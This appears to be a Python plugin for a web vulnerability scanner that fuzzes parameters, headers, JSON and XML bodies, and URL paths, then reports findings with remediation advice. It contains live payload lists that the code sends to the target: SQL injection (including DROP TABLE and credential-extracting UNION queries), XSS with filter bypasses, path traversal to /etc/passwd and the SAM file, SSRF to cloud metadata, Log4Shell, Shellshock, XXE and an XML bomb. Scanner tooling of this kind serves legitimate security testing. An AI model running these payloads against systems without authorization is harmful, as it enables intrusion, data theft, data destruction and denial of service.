"""
Fuzzing Engine — Advanced HTTP parameter, header, body, path traversal,
SQL injection, and XSS fuzzing with context-aware targeting.
"""

import html
import json
import logging
import re
import urllib.parse
from typing import Any

import requests

logger = logging.getLogger("Cascavel.Plugins.FuzzingEngine")

# HTTP parameter fuzzing payloads
PARAM_PAYLOADS: list[dict[str, str]] = [
    {"payload": "'", "type": "SINGLE_QUOTE", "checks": ["sql", "error"]},
    {"payload": '"', "type": "DOUBLE_QUOTE", "checks": ["sql", "error"]},
    {"payload": "1 OR 1=1", "type": "SQL_BOOLEAN", "checks": ["sql"]},
    {"payload": "1' OR '1'='1", "type": "SQL_STRING", "checks": ["sql"]},
    {"payload": "'; DROP TABLE users;--", "type": "SQL_DANGEROUS", "checks": ["sql"]},
    {"payload": "1 UNION SELECT NULL--", "type": "SQL_UNION", "checks": ["sql"]},
    {"payload": "1 AND SLEEP(3)--", "type": "SQL_TIME", "checks": ["sql_time"]},
    {"payload": "<script>alert(1)</script>", "type": "XSS_BASIC", "checks": ["xss"]},
    {"payload": '"><img src=x onerror=alert(1)>', "type": "XSS_IMG", "checks": ["xss"]},
    {"payload": "javascript:alert(1)", "type": "XSS_JS_URI", "checks": ["xss"]},
    {"payload": "{{7*7}}", "type": "SSTI_JINJA", "checks": ["ssti"]},
    {"payload": "${7*7}", "type": "SSTI_FREEMARKER", "checks": ["ssti"]},
    {"payload": "#{7*7}", "type": "SSTI_RUBY", "checks": ["ssti"]},
    {"payload": "../../../etc/passwd", "type": "LFI_UNIX", "checks": ["lfi"]},
    {"payload": "..\\..\\..\\windows\\system32\\config\\sam", "type": "LFI_WIN", "checks": ["lfi"]},
    {"payload": "/etc/passwd", "type": "LFI_ABSOLUTE", "checks": ["lfi"]},
    {"payload": "file:///etc/passwd", "type": "LFI_FILE_URI", "checks": ["lfi"]},
    {"payload": "http://169.254.169.254/latest/meta-data/", "type": "SSRF_AWS", "checks": ["ssrf"]},
    {"payload": "http://127.0.0.1:80", "type": "SSRF_LOCAL", "checks": ["ssrf"]},
    {"payload": "http://[::1]", "type": "SSRF_IPV6", "checks": ["ssrf"]},
    {"payload": "{{constructor.constructor('return this')()}}", "type": "PROTO_POLLUTION", "checks": ["proto"]},
    {"payload": "null", "type": "NULL_BYTE", "checks": ["null"]},
    {"payload": "A" * 10000, "type": "OVERFLOW", "checks": ["error"]},
    {"payload": "%00", "type": "NULL_TERMINATOR", "checks": ["null"]},
    {"payload": "${jndi:ldap://127.0.0.1/a}", "type": "LOG4SHELL", "checks": ["rce"]},
    {"payload": "${${env:BARFOO}}", "type": "LOG4SHELL_OBFUSC", "checks": ["rce"]},
]

# Header fuzzing payloads
HEADER_PAYLOADS: list[dict[str, Any]] = [
    {"header": "X-Forwarded-For", "values": ["127.0.0.1", "10.0.0.1", "192.168.1.1", "0.0.0.0", "localhost", "::1"], "type": "IP_SPOOF"},
    {"header": "X-Real-IP", "values": ["127.0.0.1", "10.0.0.1"], "type": "IP_SPOOF"},
    {"header": "X-Original-URL", "values": ["/admin", "/admin/config", "/internal"], "type": "URL_REWRITE"},
    {"header": "X-Rewrite-URL", "values": ["/admin", "/admin/config", "/internal"], "type": "URL_REWRITE"},
    {"header": "X-Custom-IP-Authorization", "values": ["127.0.0.1"], "type": "AUTH_BYPASS"},
    {"header": "X-Host", "values": ["evil.com", "localhost", "127.0.0.1"], "type": "HOST_INJECTION"},
    {"header": "X-Forwarded-Host", "values": ["evil.com", "localhost"], "type": "HOST_INJECTION"},
    {"header": "Referer", "values": ["http://evil.com", "javascript:alert(1)"], "type": "REFERER_INJECTION"},
    {"header": "Content-Type", "values": ["application/json", "application/xml", "text/xml", "application/x-www-form-urlencoded"], "type": "CONTENT_TYPE_SWITCH"},
    {"header": "Accept", "values": ["application/json", "text/html", "application/xml"], "type": "CONTENT_NEGOTIATION"},
    {"header": "User-Agent", "values": [
        "Mozilla/5.0 (compatible; Googlebot/2.1)",
        "() { :; }; echo; echo; /bin/cat /etc/passwd",
        "{{7*7}}",
        "<script>alert(1)</script>",
    ], "type": "UA_INJECTION"},
]

# JSON body fuzzing payloads
JSON_PAYLOADS: list[dict[str, Any]] = [
    {"payload": {"key": "'"}, "type": "JSON_SQL_QUOTE", "checks": ["sql"]},
    {"payload": {"key": "<script>alert(1)</script>"}, "type": "JSON_XSS", "checks": ["xss"]},
    {"payload": {"key": "{{7*7}}"}, "type": "JSON_SSTI", "checks": ["ssti"]},
    {"payload": {"key": "../../../etc/passwd"}, "type": "JSON_PATH_TRAVERSAL", "checks": ["lfi"]},
    {"payload": {"key": "${jndi:ldap://127.0.0.1/a}"}, "type": "JSON_LOG4SHELL", "checks": ["rce"]},
    {"payload": {"key": True}, "type": "JSON_BOOL", "checks": ["mass_assignment"]},
    {"payload": {"key": 0}, "type": "JSON_ZERO", "checks": ["logic"]},
    {"payload": {"key": -1}, "type": "JSON_NEGATIVE", "checks": ["logic"]},
    {"payload": {"key": 999999999}, "type": "JSON_LARGE_INT", "checks": ["overflow"]},
    {"payload": {"key": None}, "type": "JSON_NULL", "checks": ["null"]},
    {"payload": {"key": []}, "type": "JSON_EMPTY_ARRAY", "checks": ["logic"]},
    {"payload": {"key": {}}, "type": "JSON_EMPTY_OBJ", "checks": ["logic"]},
    {"payload": {"__proto__": {"admin": True}}, "type": "PROTO_POLLUTION", "checks": ["proto"]},
    {"payload": {"constructor": {"prototype": {"admin": True}}}, "type": "PROTO_POLLUTION_CONSTRUCTOR", "checks": ["proto"]},
]

# XML body fuzzing payloads
XML_PAYLOADS: list[dict[str, str]] = [
    {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', "type": "XXE_FILE", "checks": ["xxe"]},
    {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>', "type": "XXE_SSRF", "checks": ["xxe", "ssrf"]},
    {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><root>&xxe;</root>', "type": "XXE_INTERNAL", "checks": ["xxe"]},
    {"payload": "<root>' OR 1=1--</root>", "type": "XML_SQL", "checks": ["sql"]},
    {"payload": "<root><script>alert(1)</script></root>", "type": "XML_XSS", "checks": ["xss"]},
    {"payload": '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">]><root>&lol4;</root>', "type": "XXE_BOMB", "checks": ["xxe_dos"]},
]

# Path traversal fuzzing
PATH_TRAVERSAL_PAYLOADS: list[str] = [
    "../",
    "../../",
    "../../../",
    "../../../../../../",
    "..../",
    "..%2f",
    "..%252f",
    "%2e%2e/",
    "%2e%2e%2f",
    "..\\",
    "..%5c",
    "%2e%2e\\",
    "....//",
    "..;/",
    "..;\\",
    "..%00/",
    "..%00/",
    "/..;/",
    "/../../../",
    "\\..\\..\\",
    "file:///etc/passwd",
    "file:///c:/windows/system32/config/sam",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "expect://id",
    "data:text/plain;base64,dGVzdA==",
]

# SQL injection fuzzing payloads
SQLI_PAYLOADS: list[dict[str, Any]] = [
    {"payload": "'", "type": "SINGLE_QUOTE", "checks": ["error"]},
    {"payload": "\"", "type": "DOUBLE_QUOTE", "checks": ["error"]},
    {"payload": "1 OR 1=1", "type": "BOOLEAN_TRUE", "checks": ["boolean"]},
    {"payload": "1 OR 1=2", "type": "BOOLEAN_FALSE", "checks": ["boolean"]},
    {"payload": "1' OR '1'='1", "type": "STRING_TRUE", "checks": ["boolean"]},
    {"payload": "1' OR '1'='2", "type": "STRING_FALSE", "checks": ["boolean"]},
    {"payload": "1 UNION SELECT NULL--", "type": "UNION_NULL", "checks": ["union"]},
    {"payload": "1 UNION SELECT NULL,NULL--", "type": "UNION_2COL", "checks": ["union"]},
    {"payload": "1 UNION SELECT NULL,NULL,NULL--", "type": "UNION_3COL", "checks": ["union"]},
    {"payload": "1 AND 1=1--", "type": "AND_TRUE", "checks": ["boolean"]},
    {"payload": "1 AND 1=2--", "type": "AND_FALSE", "checks": ["boolean"]},
    {"payload": "1 ORDER BY 1--", "type": "ORDER_BY", "checks": ["error"]},
    {"payload": "1 ORDER BY 100--", "type": "ORDER_BY_HIGH", "checks": ["error"]},
    {"payload": "'; WAITFOR DELAY '0:0:3'--", "type": "TIME_MSSQL", "checks": ["time"]},
    {"payload": "1; SELECT SLEEP(3)--", "type": "TIME_MYSQL", "checks": ["time"]},
    {"payload": "1; SELECT pg_sleep(3)--", "type": "TIME_PG", "checks": ["time"]},
    {"payload": "1 AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", "type": "ERROR_MYSQL", "checks": ["error"]},
    {"payload": "1 AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--", "type": "UPDATEXML_MYSQL", "checks": ["error"]},
    {"payload": "1' AND '1'='1' UNION SELECT username,password FROM users--", "type": "DATA_EXFIL", "checks": ["data"]},
]

# XSS fuzzing payloads
XSS_PAYLOADS: list[dict[str, Any]] = [
    {"payload": "<script>alert(1)</script>", "type": "SCRIPT_TAG", "checks": ["reflected"]},
    {"payload": '"><script>alert(1)</script>', "type": "ATTR_CLOSE", "checks": ["reflected"]},
    {"payload": "'-alert(1)-'", "type": "JS_CONTEXT", "checks": ["reflected"]},
    {"payload": "<img src=x onerror=alert(1)>", "type": "IMG_ONERROR", "checks": ["reflected"]},
    {"payload": "<svg onload=alert(1)>", "type": "SVG_ONLOAD", "checks": ["reflected"]},
    {"payload": "<body onpageshow=alert(1)>", "type": "BODY_EVENT", "checks": ["reflected"]},
    {"payload": "<details open ontoggle=alert(1)>", "type": "DETAILS_TOGGLE", "checks": ["reflected"]},
    {"payload": "javascript:alert(1)", "type": "JS_URI", "checks": ["uri"]},
    {"payload": "data:text/html,<script>alert(1)</script>", "type": "DATA_URI", "checks": ["uri"]},
    {"payload": "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e", "type": "HEX_ENCODED", "checks": ["reflected"]},
    {"payload": "&#60;script&#62;alert(1)&#60;/script&#62;", "type": "HTML_ENTITY", "checks": ["reflected"]},
    {"payload": "<Img/Src/OnError=(alert)(1)>", "type": "WAF_BYPASS", "checks": ["reflected"]},
    {"payload": "<svg/onload=confirm`1`>", "type": "BACKTICK", "checks": ["reflected"]},
]

# SQL error patterns
SQL_ERROR_PATTERNS: list[str] = [
    r"sql syntax.*?mysql",
    r"warning.*?mysql",
    r"MySQLSyntaxErrorException",
    r"valid MySQL result",
    r"check the manual that corresponds to your MySQL",
    r"PostgreSQL.*?ERROR",
    r"WARNING.*?PostgreSQL",
    r"PG::SyntaxError",
    r"org\.postgresql\.util\.PSQLException",
    r"ERROR:\s+syntax error at or near",
    r"Driver.*?SQL[\-\_\ ]*Server",
    r"OLE DB.*?SQL Server",
    r"\bSQL Server[^&lt;&quot;]+Driver",
    r"Warning.*?mssql_",
    r"\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}",
    r"System\.Data\.SqlClient\.SqlException",
    r"Unclosed quotation mark after the character string",
    r"Microsoft SQL Native Client error",
    r"ORA-\d{5}",
    r"Oracle.*?Driver",
    r"Warning.*?\boci_",
    r"Warning.*?\bora_",
    r"quoted string not properly terminated",
    r"SQLSTATE\[\w+\]",
    r"SQLite/JDBCDriver",
    r"SQLite\.Exception",
    r"System\.Data\.SQLite\.SQLiteException",
    r"Warning.*?sqlite_",
    r"Warning.*?SQLite3::",
    r"\[SQLITE_ERROR\]",
    r"SQLite error",
]

# LFI success indicators
LFI_INDICATORS: list[str] = [
    "root:x:0:0:",
    "daemon:x:",
    "bin:x:",
    "sys:x:",
    "[boot loader]",
    "[operating systems]",
    "nobody:x:",
    "/bin/bash",
    "/bin/sh",
    "/usr/sbin/nologin",
    "www-data:",
    "mysql:",
    "postgres:",
]


def _fuzz_parameters(
    url: str, session: requests.Session, discovered_params: list[str] | None
) -> list[dict[str, Any]]:
    """Fuzz HTTP parameters with various payloads."""
    findings: list[dict[str, Any]] = []
    params_to_fuzz = discovered_params or ["q", "id", "search", "page", "input", "name", "value"]

    for param in params_to_fuzz[:15]:  # Limit to prevent excessive requests
        for fp in PARAM_PAYLOADS:
            try:
                resp = session.get(
                    url,
                    params={param: fp["payload"]},
                    timeout=10,
                    allow_redirects=True,
                )

                body = resp.text.lower()

                # Check for SQL errors
                if "sql" in fp["checks"]:
                    for pattern in SQL_ERROR_PATTERNS:
                        if re.search(pattern, body, re.IGNORECASE):
                            findings.append({
                                "tipo": "SQL_INJECTION",
                                "severidade": "CRITICO",
                                "titulo": f"SQL injection via parameter '{param}' ({fp['type']})",
                                "descricao": (
                                    f"Parameter '{param}' with payload '{fp['payload'][:50]}' "
                                    f"triggered SQL error pattern: {pattern}"
                                ),
                                "parametro": param,
                                "payload": fp["payload"],
                                "payload_type": fp["type"],
                                "evidence": re.search(pattern, body, re.IGNORECASE).group()[:200],
                                "remediacao": "Use parameterized queries/prepared statements. Never concatenate user input into SQL.",
                            })
                            break

                # Check for SSTI (49 = 7*7)
                if "ssti" in fp["checks"] and "49" in body and "49" not in resp.text:
                    pass  # Avoid false positives from page content

                # Check for LFI
                if "lfi" in fp["checks"]:
                    for indicator in LFI_INDICATORS:
                        if indicator in body:
                            findings.append({
                                "tipo": "LFI",
                                "severidade": "CRITICO",
                                "titulo": f"Local file inclusion via parameter '{param}' ({fp['type']})",
                                "descricao": (
                                    f"Parameter '{param}' with payload '{fp['payload'][:50]}' "
                                    f"returned file content containing: {indicator}"
                                ),
                                "parametro": param,
                                "payload": fp["payload"],
                                "evidence": indicator,
                                "remediacao": "Validate and sanitize file paths. Use chroot environments. Block directory traversal sequences.",
                            })
                            break

                # Check for reflected XSS (payload appears in response unescaped)
                if "xss" in fp["checks"]:
                    if fp["payload"] in resp.text and "<script>" in resp.text.lower():
                        findings.append({
                            "tipo": "XSS_REFLECTED",
                            "severidade": "ALTO",
                            "titulo": f"Reflected XSS via parameter '{param}' ({fp['type']})",
                            "descricao": (
                                f"Parameter '{param}' reflects payload '{fp['payload'][:50]}' "
                                "unescaped in response body."
                            ),
                            "parametro": param,
                            "payload": fp["payload"],
                            "remediacao": "Implement output encoding (HTML, JS, URL context). Add Content-Security-Policy header.",
                        })

                # Check for excessive error disclosure
                if "error" in fp["checks"]:
                    error_indicators = [
                        "stack trace", "traceback", "exception", "at line",
                        "syntax error", "undefined variable", "fatal error",
                        "internal server error", "debug", "warning:",
                    ]
                    for err in error_indicators:
                        if err in body and len(resp.text) > 500:
                            findings.append({
                                "tipo": "ERROR_DISCLOSURE",
                                "severidade": "MEDIO",
                                "titulo": f"Error disclosure via parameter '{param}' ({fp['type']})",
                                "descricao": (
                                    f"Parameter '{param}' triggered error disclosure: '{err}'. "
                                    "Server leaks internal error details."
                                ),
                                "parametro": param,
                                "payload": fp["payload"],
                                "remediacao": "Implement custom error pages. Never expose stack traces in production.",
                            })
                            break

            except requests.Timeout:
                # Time-based SQL injection detection
                if "sql_time" in fp["checks"]:
                    findings.append({
                        "tipo": "SQL_INJECTION_TIME",
                        "severidade": "CRITICO",
                        "titulo": f"Time-based SQL injection via parameter '{param}'",
                        "descricao": (
                            f"Parameter '{param}' with SLEEP payload caused timeout, "
                            "indicating time-based blind SQL injection."
                        ),
                        "parametro": param,
                        "payload": fp["payload"],
                        "remediacao": "Use parameterized queries. Set database query timeouts.",
                    })
            except requests.RequestException:
                continue

    return findings


def _fuzz_headers(url: str, session: requests.Session) -> list[dict[str, Any]]:
    """Fuzz HTTP headers for security issues."""
    findings: list[dict[str, Any]] = []

    # Baseline response
    try:
        baseline = session.get(url, timeout=8)
        baseline_status = baseline.status_code
        baseline_len = len(baseline.content)
    except requests.RequestException:
        return findings

    for hp in HEADER_PAYLOADS:
        for value in hp["values"]:
            try:
                resp = session.get(
                    url,
                    headers={hp["header"]: value},
                    timeout=8,
                    allow_redirects=False,
                )

                # Check for access control bypass via IP headers
                if hp["type"] == "IP_SPOOF":
                    if resp.status_code == 200 and baseline_status != 200:
                        findings.append({
                            "tipo": "AUTH_BYPASS_HEADER",
                            "severidade": "CRITICO",
                            "titulo": f"Auth bypass via {hp['header']}: {value}",
                            "descricao": (
                                f"Setting {hp['header']}: {value} changed response from "
                                f"HTTP {baseline_status} to HTTP 200. "
                                "IP-based access control can be bypassed."
                            ),
                            "header": hp["header"],
                            "value": value,
                            "remediacao": "Do not trust client-provided IP headers for access control. Use server-side IP validation.",
                        })

                # Check for URL rewrite bypass
                if hp["type"] == "URL_REWRITE":
                    if resp.status_code in (200, 301, 302) and baseline_status != resp.status_code:
                        findings.append({
                            "tipo": "URL_REWRITE_BYPASS",
                            "severidade": "ALTO",
                            "titulo": f"URL rewrite bypass via {hp['header']}",
                            "descricao": (
                                f"Setting {hp['header']}: {value} caused HTTP {resp.status_code}. "
                                "URL rewriting can bypass access controls."
                            ),
                            "header": hp["header"],
                            "value": value,
                            "remediacao": "Remove X-Original-URL and X-Rewrite-URL header processing in production.",
                        })

                # Check for host header injection
                if hp["type"] == "HOST_INJECTION":
                    if value in resp.text:
                        findings.append({
                            "tipo": "HOST_INJECTION",
                            "severidade": "MEDIO",
                            "titulo": f"Host header injection via {hp['header']}",
                            "descricao": (
                                f"Injected host '{value}' via {hp['header']} is reflected in response. "
                                "Can be used for password reset poisoning or cache poisoning."
                            ),
                            "header": hp["header"],
                            "value": value,
                            "remediacao": "Validate Host header against allowed domains. Use absolute URLs in application code.",
                        })

                # Check for user-agent injection
                if hp["type"] == "UA_INJECTION":
                    if value in resp.text and "<script>" in value:
                        findings.append({
                            "tipo": "UA_XSS",
                            "severidade": "ALTO",
                            "titulo": "User-Agent XSS injection",
                            "descricao": "User-Agent payload is reflected unescaped in response body.",
                            "header": "User-Agent",
                            "payload": value,
                            "remediacao": "Encode all user-supplied headers before rendering.",
                        })

            except requests.RequestException:
                continue

    return findings


def _fuzz_json_body(url: str, session: requests.Session) -> list[dict[str, Any]]:
    """Fuzz JSON request body with various payloads."""
    findings: list[dict[str, Any]] = []

    for jp in JSON_PAYLOADS:
        try:
            resp = session.post(
                url,
                json=jp["payload"],
                headers={"Content-Type": "application/json"},
                timeout=8,
                allow_redirects=False,
            )

            body = resp.text.lower()

            # Check for prototype pollution
            if jp["type"].startswith("PROTO"):
                if resp.status_code == 200:
                    findings.append({
                        "tipo": "PROTO_POLLUTION",
                        "severidade": "ALTO",
                        "titulo": f"Potential prototype pollution ({jp['type']})",
                        "descricao": (
                            f"JSON payload with __proto__/constructor accepted (HTTP 200). "
                            "Prototype pollution can lead to RCE or privilege escalation."
                        ),
                        "payload": jp["payload"],
                        "remediacao": "Use Map instead of plain objects. Freeze Object.prototype. Validate JSON schema.",
                    })

            # Check for SQL errors in JSON responses
            if "sql" in jp["checks"]:
                for pattern in SQL_ERROR_PATTERNS:
                    if re.search(pattern, body, re.IGNORECASE):
                        findings.append({
                            "tipo": "SQL_INJECTION_JSON",
                            "severidade": "CRITICO",
                            "titulo": f"SQL injection via JSON body ({jp['type']})",
                            "descricao": f"JSON payload triggered SQL error: {pattern}",
                            "payload": jp["payload"],
                            "remediacao": "Use parameterized queries for all database operations including JSON inputs.",
                        })
                        break

        except requests.RequestException:
            continue

    return findings


def _fuzz_xml_body(url: str, session: requests.Session) -> list[dict[str, Any]]:
    """Fuzz XML request body for XXE and injection."""
    findings: list[dict[str, Any]] = []

    for xp in XML_PAYLOADS:
        try:
            resp = session.post(
                url,
                data=xp["payload"],
                headers={"Content-Type": "application/xml"},
                timeout=10,
                allow_redirects=False,
            )

            body = resp.text

            # Check for XXE file disclosure
            if "xxe" in xp["checks"]:
                if any(ind in body for ind in LFI_INDICATORS):
                    findings.append({
                        "tipo": "XXE",
                        "severidade": "CRITICO",
                        "titulo": f"XXE file disclosure ({xp['type']})",
                        "descricao": "XML External Entity payload returned sensitive file contents.",
                        "payload": xp["payload"][:200],
                        "remediacao": "Disable external entity processing in XML parser. Use JSON instead of XML where possible.",
                    })

            # Check for XXE DoS (billion laughs)
            if "xxe_dos" in xp["checks"]:
                if resp.elapsed.total_seconds() > 3:
                    findings.append({
                        "tipo": "XXE_DOS",
                        "severidade": "ALTO",
                        "titulo": "XML bomb (billion laughs) caused high latency",
                        "descricao": f"XML bomb caused {resp.elapsed.total_seconds():.1f}s delay. Server may be vulnerable to DoS.",
                        "remediacao": "Disable DTD processing. Set XML parser resource limits.",
                    })

        except requests.Timeout:
            if "xxe_dos" in xp["checks"]:
                findings.append({
                    "tipo": "XXE_DOS",
                    "severidade": "CRITICO",
                    "titulo": "XML bomb caused server timeout",
                    "descricao": "XML bomb caused request timeout, confirming DoS vulnerability.",
                    "remediacao": "Disable DTD processing. Set XML parser timeouts and entity expansion limits.",
                })
        except requests.RequestException:
            continue

    return findings


def _fuzz_path_traversal(base_url: str, session: requests.Session) -> list[dict[str, Any]]:
    """Test path traversal on URL paths."""
    findings: list[dict[str, Any]] = []

    test_paths = [
        "/", "/api/", "/files/", "/download/", "/view/", "/page/",
        "/admin/", "/static/", "/assets/", "/uploads/",
    ]

    for base_path in test_paths[:5]:
        for traversal in PATH_TRAVERSAL_PAYLOADS[:10]:
            try:
                test_url = f"{base_url}{base_path}{traversal}"
                resp = session.get(test_url, timeout=6, allow_redirects=False)

                if resp.status_code == 200:
                    body = resp.text
                    for indicator in LFI_INDICATORS:
                        if indicator in body:
                            findings.append({
                                "tipo": "PATH_TRAVERSAL",
                                "severidade": "CRITICO",
                                "titulo": f"Path traversal at {base_path}",
                                "descricao": (
                                    f"Path traversal payload '{traversal}' at {base_path} "
                                    f"returned sensitive content: {indicator}"
                                ),
                                "path": base_path,
                                "payload": traversal,
                                "evidence": indicator,
                                "remediacao": "Validate and normalize file paths. Use chroot/containers. Block traversal sequences.",
                            })
                            break

            except requests.RequestException:
                continue

    return findings


def _fuzz_sqli_url(url: str, session: requests.Session, discovered_params: list[str] | None) -> list[dict[str, Any]]:
    """Targeted SQL injection fuzzing."""
    findings: list[dict[str, Any]] = []
    params = discovered_params or ["id", "user", "page", "category", "item", "order", "sort"]

    for param in params[:10]:
        for sp in SQLI_PAYLOADS:
            try:
                resp = session.get(
                    url,
                    params={param: sp["payload"]},
                    timeout=10,
                    allow_redirects=True,
                )
                body = resp.text.lower()

                # Error-based detection
                if "error" in sp["checks"]:
                    for pattern in SQL_ERROR_PATTERNS:
                        if re.search(pattern, body, re.IGNORECASE):
                            findings.append({
                                "tipo": "SQLI_DETAILED",
                                "severidade": "CRITICO",
                                "titulo": f"SQL injection: {sp['type']} via '{param}'",
                                "descricao": (
                                    f"Parameter '{param}' with {sp['type']} payload "
                                    f"triggers SQL error. Database type identifiable from error."
                                ),
                                "parametro": param,
                                "payload": sp["payload"],
                                "type": sp["type"],
                                "evidence": re.search(pattern, body, re.IGNORECASE).group()[:200],
                                "remediacao": (
                                    "Immediate: Use parameterized queries/prepared statements. "
                                    "Set database error mode to generic. "
                                    "Long-term: WAF + RASP + least-privilege DB accounts."
                                ),
                            })
                            break

                # Boolean-based detection (compare true vs false)
                if sp["type"] in ("BOOLEAN_TRUE", "STRING_TRUE", "AND_TRUE"):
                    true_len = len(resp.text)
                elif sp["type"] in ("BOOLEAN_FALSE", "STRING_FALSE", "AND_FALSE"):
                    false_len = len(resp.text)
                    if "true_len" in dir() and abs(true_len - false_len) > 100:
                        findings.append({
                            "tipo": "SQLI_BOOLEAN",
                            "severidade": "CRITICO",
                            "titulo": f"Boolean-based blind SQLi via '{param}'",
                            "descricao": (
                                f"Response length differs significantly between true ({true_len}) "
                                f"and false ({false_len}) conditions."
                            ),
                            "parametro": param,
                            "remediacao": "Use parameterized queries. Monitor for boolean-based extraction patterns.",
                        })

            except requests.Timeout:
                if "time" in sp["checks"]:
                    findings.append({
                        "tipo": "SQLI_TIME",
                        "severidade": "CRITICO",
                        "titulo": f"Time-based blind SQLi via '{param}'",
                        "descricao": f"SLEEP payload on '{param}' caused timeout.",
                        "parametro": param,
                        "payload": sp["payload"],
                        "remediacao": "Use parameterized queries. Set query timeouts at database level.",
                    })
            except requests.RequestException:
                continue

    return findings


def _fuzz_xss_url(url: str, session: requests.Session, discovered_params: list[str] | None) -> list[dict[str, Any]]:
    """Targeted XSS fuzzing."""
    findings: list[dict[str, Any]] = []
    params = discovered_params or ["q", "search", "input", "name", "text", "msg", "value", "content"]

    for param in params[:10]:
        for xp in XSS_PAYLOADS:
            try:
                resp = session.get(
                    url,
                    params={param: xp["payload"]},
                    timeout=8,
                    allow_redirects=True,
                )

                # Check if payload is reflected unescaped
                if xp["payload"] in resp.text:
                    # Verify it's not already encoded
                    encoded = html.escape(xp["payload"])
                    if encoded not in resp.text:
                        findings.append({
                            "tipo": "XSS_FUZZ",
                            "severidade": "ALTO",
                            "titulo": f"XSS: {xp['type']} via '{param}'",
                            "descricao": (
                                f"Payload '{xp['payload'][:60]}' reflected unescaped in response. "
                                f"XSS type: {xp['type']}"
                            ),
                            "parametro": param,
                            "payload": xp["payload"],
                            "xss_type": xp["type"],
                            "remediacao": (
                                "Implement context-aware output encoding (HTML, JS, URL, CSS). "
                                "Add Content-Security-Policy with strict nonce. "
                                "Set X-XSS-Protection: 1; mode=block."
                            ),
                        })

            except requests.RequestException:
                continue

    return findings


def run(
    target: str,
    ip: str,
    ports: list[int],
    banners: dict[str, str],
    context: dict | None = None,
) -> dict[str, Any] | None:
    """Main plugin entry point — Advanced fuzzing engine."""
    resultados: list[dict[str, Any]] = []

    scheme = "https" if 443 in ports else "http"
    primary_port = 443 if 443 in ports else (ports[0] if ports else 80)
    base_url = f"{scheme}://{target}" if primary_port in (80, 443) else f"{scheme}://{target}:{primary_port}"

    # Extract discovered parameters from context
    discovered_params: list[str] | None = None
    if context:
        discovered_params = context.get("discovered_params")
        if not discovered_params:
            # Try to extract from findings
            for finding in context.get("findings", []):
                if isinstance(finding, dict):
                    params = finding.get("params") or finding.get("parameters")
                    if isinstance(params, list):
                        discovered_params = params
                        break

    session = requests.Session()
    session.headers.update({
        "Accept": "text/html, application/json, */*",
        "Accept-Language": "en-US,en;q=0.9",
    })

    # URLs to fuzz
    fuzz_targets = [
        f"{base_url}/",
        f"{base_url}/api",
        f"{base_url}/search",
        f"{base_url}/login",
    ]

    # Add context-discovered URLs
    if context:
        for finding in context.get("findings", []):
            if isinstance(finding, dict):
                endpoint = finding.get("endpoint") or finding.get("url")
                if endpoint and isinstance(endpoint, str):
                    fuzz_targets.append(endpoint)

    fuzz_targets = list(set(fuzz_targets))[:10]

    try:
        for fuzz_url in fuzz_targets:
            # 1. Parameter fuzzing
            resultados.extend(_fuzz_parameters(fuzz_url, session, discovered_params))

            # 2. Header fuzzing
            resultados.extend(_fuzz_headers(fuzz_url, session))

            # 3. JSON body fuzzing (POST endpoints)
            resultados.extend(_fuzz_json_body(fuzz_url, session))

            # 4. XML body fuzzing
            resultados.extend(_fuzz_xml_body(fuzz_url, session))

            # 5. Path traversal
            resultados.extend(_fuzz_path_traversal(base_url, session))

            # 6. SQL injection (dedicated pass)
            resultados.extend(_fuzz_sqli_url(fuzz_url, session, discovered_params))

            # 7. XSS (dedicated pass)
            resultados.extend(_fuzz_xss_url(fuzz_url, session, discovered_params))

        if not resultados:
            return None

        # Deduplicate by (tipo, titulo)
        seen: set[str] = set()
        unique: list[dict[str, Any]] = []
        for r in resultados:
            key = f"{r['tipo']}:{r['titulo']}"
            if key not in seen:
                seen.add(key)
                unique.append(r)
        resultados = unique

        severities = [r["severidade"] for r in resultados]
        crit = severities.count("CRITICO")
        alto = severities.count("ALTO")

        resultados.insert(0, {
            "tipo": "RESUMO",
            "severidade": "CRITICO" if crit > 0 else ("ALTO" if alto > 0 else "MEDIO"),
            "titulo": f"Fuzzing Engine — {len(resultados) - 1} findings",
            "descricao": (
                f"Fuzzing scan of {base_url} found "
                f"{crit} critical, {alto} high, "
                f"{severities.count('MEDIO')} medium, "
                f"{severities.count('BAIXO')} low findings. "
                f"Targets fuzzed: {len(fuzz_targets)}. "
                f"Params discovered: {len(discovered_params) if discovered_params else 'none (using defaults)'}."
            ),
            "total_resultados": len(resultados) - 1,
            "targets_fuzzed": fuzz_targets,
            "remediacao": (
                "Prioritize CRITICAL findings (SQLi, RCE, XXE). "
                "Implement defense-in-depth: input validation, parameterized queries, "
                "output encoding, WAF, CSP, and security headers."
            ),
        })

        return {"plugin": "fuzzing_engine", "resultados": resultados}

    except Exception as e:
        logger.error(f"Fuzzing engine failed for {target}: {e}")
        return {
            "plugin": "fuzzing_engine",
            "resultados": [{
                "tipo": "ERRO",
                "severidade": "INFO",
                "titulo": "Fuzzing error",
                "descricao": f"Fuzzing engine failed: {e}",
                "remediacao": "N/A",
            }],
        }
